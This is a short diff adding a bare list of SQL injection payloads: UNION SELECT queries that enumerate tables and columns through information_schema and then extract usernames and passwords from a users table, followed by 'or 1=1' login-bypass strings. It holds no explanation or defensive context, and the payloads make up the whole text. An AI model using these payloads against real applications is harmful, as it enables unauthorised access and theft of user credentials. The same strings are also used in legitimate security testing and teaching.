@@ -1,0 +1,7 @@
+1 UNION SELECT NULL,NULL,NULL,NULL FROM users --
+1 UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables -- 
+1 UNION SELECT NULL, column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' -- 
+1 UNION SELECT NULL, username, password, NULL FROM users --
+
+admin ' or '1' = '1' -- -
+' or '1' = '1' --
